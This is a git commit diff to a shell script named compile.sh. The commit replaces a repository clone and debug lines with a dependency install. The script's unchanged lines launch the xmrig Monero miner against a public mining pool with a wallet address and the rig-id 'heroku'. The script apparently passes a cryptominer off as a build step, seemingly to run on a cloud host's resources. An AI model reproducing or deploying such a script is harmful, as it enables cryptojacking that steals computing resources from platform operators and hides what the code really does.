da0c6dcfe9414b8f091d1c4bdf2a2c87703cda6a
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-24 11:50:59 +0800

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,10 +1,5 @@
-git clone https://github.com/mi33rs/herobrine /compile &&cd /compile
-
-echo "pwd and ls"
-pwd
-ls
-
-echo "end"
+echo "install deps"
+sudo apt-get install libhwloc -y
 
 chmod 755 xmrig
 ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
